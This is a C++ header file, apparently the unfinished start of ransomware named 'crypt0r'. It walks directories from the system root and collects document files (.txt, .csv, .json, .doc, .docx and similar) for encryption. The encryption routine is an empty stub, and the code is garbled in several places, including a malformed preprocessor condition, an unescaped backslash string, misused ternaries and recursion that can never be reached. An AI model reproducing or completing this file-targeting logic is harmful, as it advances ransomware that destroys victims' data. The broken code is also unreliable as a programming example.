//
// Created by ghost64 on 2/27/25.
//

#ifndef CRYPTOR_H
#define CRYPTOR_H

#ifndef PATH_SEP
#ifdef _WIN32 or _WIN64
#define PATH_SEP_CHAR "\"
#define SYS_ROOT "C:"
#else
#define PATH_SEP "/"
#define SYS_ROOT "/"
#endif

/* Main */
#include <filesystem>
#include <iostream>
#include <vector>

namespace fs = std::filesystem;

namespace files {
    std::string condition;
    std::vector<string> files;

    inline void trav_dir(const fs::path& dir, bool verbose) {
        // Does the directory exist? If so, enter and traverse the directory
        if (exists(dir)) {
            // If it's a file, encrypt it...else, enter the directory and then look for a specific file
            // then encrypt it
            if (is_directory(dir)) {
                condition = "Entering " + dir.string() + "...";

                std::cout << condition ? verbose: "" << std::endl;

                // Iterate over the contents of the current directory
                // 1. If the entry is a file of a specific extension, encrypt it
                // 2. If the entry is a directory, enter it, do step 1, repeat
                // Now, iterate over directory entries
                for (const auto& entry : std::filesystem::directory_iterator(dir)) {
                    if (entry.is_regular_file()) {
                        fs::path ext = entry.path().extension();

                        if (ext == ".txt" || ext == ".csv" || ext == ".json"
                            || ext == ".jsonp" || ext == ".jsonc"
                            || ext == ".xml" || ext == ".xmlp" || ext == ".xmlc"
                            || ext == ".xmlcsv" || ext == ".xmljson" || ext == ".xmljsonp"
                            || ext == ".doc" || ext == ".docx" || ext == ".docxp") {

                            condition = "RT_ENC " + entry.path().string() + "...";
                            std::cout << condition ? verbose: "" << std::endl;
                            // Encrypt the file. Get a list of the files and
                            // encrypt them by iterating over them
                            files.push_back(entry.path().string());

                            // Run the encryptor


                            if (is_directory(entry.path())) {
                                trav_dir(entry.path(), true);
                            }
                        }


                    }
                }
            }
        }
    }
}

namespace crypt0r {
    /* Encryption namespace */
}

#endif //CRYPTOR_H
